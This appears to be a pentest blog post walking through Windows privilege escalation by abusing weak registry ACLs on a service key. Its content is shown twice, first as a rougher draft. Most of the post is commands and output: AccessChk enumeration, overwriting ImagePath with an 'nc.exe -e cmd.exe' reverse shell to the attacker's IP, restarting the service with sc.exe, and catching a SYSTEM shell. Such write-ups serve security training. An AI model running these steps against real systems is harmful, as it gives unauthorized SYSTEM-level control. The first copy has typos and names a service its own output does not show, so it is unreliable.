---
title: Weak Registry ACLs
date: 2026-06-19 18:23:48

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Services
  
tags:
  - Weak-Registry-ACLs
  - Modifiable-Registry-Key
  - Registry-Permissions
  - ImagePath
  - KEY_SET_VALUE
  - Weak-ACL
  - AccessChk
  - Set-ItemProperty
  - sc.exe
  - Windows-Services
cover: /img/weak-registry-acls.png
top_img: /img/bg-img.jpg
description: Identify and exploit weak registry ACLs on Windows service keys to overwrite the ImagePath value, restart the service, and execute arbitrary code as SYSTEM for privilege escalation.
---








>➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as `ImagePath`. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.


### Enumerating Weak Registry Permissions

> We can use AccessChk to identify services with weak registry permissions:

```cmd
C:\> \ccesschk.exe /accepteula "<our-user>" -kvuqsw hklm\System\CurrentControlSet\services

RW HKLM\System\CurrentControlSet\services\BTAGService\Parameters\Settings
        KEY_QUERY_VALUE
        KEY_CREATE_SUB_KEYa
        KEY_ENUMERATE_SUB_KEYS
        KEY_NOTIFY
        KEY_SET_VALUE
        READ_CONTROL
<SNIP> 
```

> ➜ This means the current user has full control over the `ModelManagerService` registry key.

### Modifying the Service ImagePath

> Since we have write access, we can change the service executable path to a malicious binary:

```
PS> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>" -Name ImagePath -Value "C:\path\to\nc.exe -e cmd.exe <our-ip> <our-port>"
```

> This modifies the service configuration to execute our malicious binary.


## Restarting the Service

Restart the service to execute the malicious binary:

```powershell
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```

## Get Reverse Shell

```bash
➜ rlwrap nc -lvnp our-port

C:\WINDOWS\system32> whoami
nt authority\system
```







> ➜ Weak Registry ACLs occur when a low-privileged user has `write` or `full control` permissions over a service's registry key, allowing them to modify critical values such as `ImagePath`. By pointing `ImagePath` at a malicious binary and restarting the service, an attacker executes code under the service's account, typically `SYSTEM`.

# Enumeration

#### Enumerating Weak Registry Permissions

> ➜ We use AccessChk to recurse the services hive and list keys our user can write to. The `ImagePath` value lives directly under the service root key, so what we need is `KEY_SET_VALUE` on `HKLM\System\CurrentControlSet\services\<service-name>` itself

```cmd
C:\> .\accesschk.exe /accepteula -kvuqsw "<our-user>" hklm\System\CurrentControlSet\services

RW HKLM\System\CurrentControlSet\services\<service-name>
        KEY_QUERY_VALUE
        KEY_SET_VALUE
        KEY_CREATE_SUB_KEY
        KEY_ENUMERATE_SUB_KEYS
        KEY_NOTIFY
        READ_CONTROL
<SNIP>
```

#### Checking the Service Account

> ➜ We confirm the service runs as `LocalSystem` with `sc qc`, this is what makes the payload execute as `SYSTEM`.

```powershell
PS C:\> sc.exe qc <service-name>

[SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: <service-name>
    TYPE               : 10  WIN32_OWN_PROCESS
    START_TYPE         : 2   AUTO_START
    BINARY_PATH_NAME   : "C:\Program Files\<service-name>\<service-name>.exe"
    SERVICE_START_NAME : LocalSystem
```

# Exploitation

#### Modifying the Service ImagePath

> ➜ Since we can write to the service key, we overwrite `ImagePath` to point at our payload. `nc.exe` must already be staged on disk at the path we reference.


```powershell
PS C:\> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\<service-name>" -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd.exe ip port"
```

#### Starting the Listener


```bash
rlwrap nc -lvnp port
```

#### Restarting the Service

> ➜ Restarting forces the service to launch our new `ImagePath` and this needs `SERVICE_STOP` and `SERVICE_START` over the service (or a reboot). A raw `nc` payload isn't service-aware, so the SCM will time out after ~30 seconds and report a start failure, that's expected and the shell fires regardless.

```powershell
PS C:\> sc.exe stop <service-name>
PS C:\> sc.exe start <service-name>
```
#### Getting a SYSTEM Shell

```bash
➜  weak-registry rlwrap nc -lvnp port

C:\WINDOWS\system32> whoami
nt authority\system
```